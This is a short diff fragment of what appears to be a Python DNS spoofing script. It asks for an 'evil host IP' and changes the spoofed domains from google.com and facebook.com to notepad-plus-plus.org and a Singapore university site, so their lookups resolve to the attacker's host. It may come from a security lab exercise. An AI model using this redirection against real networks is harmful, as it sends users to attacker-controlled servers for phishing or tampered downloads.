@@ -74,8 +74,8 @@ if __name__ == '__main__':
     evilhost_ip = input("\nInput evil host IP: ")
     try:
         fakewebDict = {
-            b"google.com.": evilhost_ip,
-            b"facebook.com.": evilhost_ip
+            b"notepad-plus-plus.org": evilhost_ip,
+            b"xsite.singaporetech.edu.sg": evilhost_ip
         }
         queueCount = 1
         log.basicConfig(format='%(asctime)s - %(message)s',
